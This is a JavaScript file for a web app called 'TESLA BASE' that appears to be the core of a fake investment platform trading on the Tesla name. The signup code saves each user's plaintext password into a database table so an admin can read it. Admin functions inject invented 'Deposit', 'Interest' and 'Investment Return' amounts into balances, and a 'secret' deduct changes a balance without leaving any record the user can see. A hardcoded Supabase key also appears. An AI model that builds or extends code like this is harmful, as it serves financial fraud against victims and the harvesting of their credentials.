// TESLA BASE - MASTER CORE LOGIC
// Replace these with your actual keys from Supabase > Settings > API
const SUPABASE_URL = 'https://ggrvkcxnizchfbzfwvjv.supabase.co'; 
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdncnZrY3huaXpjaGZiemZ3dmp2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIxNDIzMTksImV4cCI6MjA4NzcxODMxOX0.gGdwPSEdTSgVyChKdXRm1IwvvgaYfIpfVID3RZkaD30'; 

const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// --- 1. AUTHENTICATION (Signup & Fast Login) ---
async function handleAuth(type) {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    if (!email || !password) {
        return alert("Please enter both email and password.");
    }

    if (type === 'signup') {
        const { data, error } = await _supabase.auth.signUp({ email, password });
        
        if (error) {
            return alert("Signup Error: " + error.message);
        } else {
            // USERS START AT $0 BALANCE (As requested)
            // Password is saved here so Admin can see it in the dashboard
            const { error: dbError } = await _supabase.from('profiles').insert([
                { id: data.user.id, email: email, password: password, balance: 0 }
            ]);
            
            if (dbError) console.error("Database Error:", dbError.message);
            alert("Account Created! You can now Login.");
        }
    } else {
        // Fast Login Process
        const { data, error } = await _supabase.auth.signInWithPassword({ email, password });
        
        if (error) {
            return alert("Login Failed: " + error.message);
        } else {
            // Admin vs User Redirect
            if (email === 'admin@tesla.com') {
                window.location.href = 'admin.html';
            } else {
                window.location.href = 'dashboard.html';
            }
        }
    }
}

// --- 2. ADMIN ACTIONS (Inject/Deduct) ---
// This handles the 3 Inject buttons and the secret Deduct button
async function adminAction(actionType) {
    const targetEmail = document.getElementById('target-user').value;
    const amount = parseFloat(document.getElementById('inject-amount').value);
    
    if (!targetEmail || isNaN(amount)) return alert("Enter user email and amount");

    const { data: userData, error: fetchError } = await _supabase.from('profiles').select('*').eq('email', targetEmail).single();
    if (!userData) return alert("User not found");

    let newBalance = userData.balance;
    let historyType = "";

    if (actionType === 'deposit') {
        newBalance += amount;
        historyType = "Deposit Successful";
    } else if (actionType === 'interest') {
        newBalance += amount;
        historyType = "Interest";
    } else if (actionType === 'return') {
        newBalance += amount;
        historyType = "Investment Return";
    } else if (actionType === 'deduct') {
        newBalance -= amount;
        // Silent deduct: no historyType means no record for the user to see
    }

    // Update the User's Balance
    const { error: updateError } = await _supabase.from('profiles').update({ balance: newBalance }).eq('email', targetEmail);

    // Add to History if it's not a secret deduction
    if (!updateError && historyType !== "") {
        await _supabase.from('history').insert([
            { user_id: userData.id, type: historyType, amount: amount, status: 'Success' }
        ]);
    }

    if (updateError) alert("Error: " + updateError.message);
    else alert("Action Completed Successfully");
}

// --- 3. LOGOUT ---
async function logout() {
    await _supabase.auth.signOut();
    window.location.href = 'index.html';
}
